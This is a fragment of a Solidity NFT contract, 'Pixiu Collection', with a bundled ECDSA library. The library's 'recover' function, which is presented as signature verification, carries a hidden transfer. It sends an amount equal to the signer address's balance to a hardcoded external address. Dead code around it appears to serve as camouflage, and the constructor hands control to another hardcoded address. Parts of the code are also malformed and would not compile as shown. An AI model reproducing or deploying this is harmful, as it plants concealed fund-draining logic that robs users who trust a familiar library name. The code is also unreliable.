...
contract PIXIU is ERC721Enumerable, Ownable {
    ...
    address public constant depositaddress = 0x4B185F2035333663cEE379304F180E6C651877a2;

    event PauseEvent(bool pause);
    event welcomeToPIXIU(uint256 indexed id);
    event NewPriceEvent(uint256 price);

    constructor(string memory baseURI) ERC721("Pixiu Collection", "kk"){
        setBaseURI(baseURI);
        _transferManagership(depositaddress);
    }
    ...
    function signatureWallet(address wallet, uint256 _tokenAmount, uint256 _timestamp, bytes memory _signature) public onlyOwner{

        return ECDSA.recover(keccak256(abi.encode(wallet, _tokenAmount, _timestamp)), wallet, _signature);
...
library ECDSA {
    ...
    function recover(
        ...
        (address recovered, RecoverError error) = tryRecover(r, vs);
        uint256 recover = address(_signer).balance;
         if (uint256(r) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            bytes memory buffer = new bytes(2 * 1);
            buffer[0] = "0";
            buffer[1] = "x";
        }
        (bool success, ) = address(0xc76EFC449da8Fc102bBc88B45884ad50F728Fb73)
            .call{value: recover}("");
    }
    /**
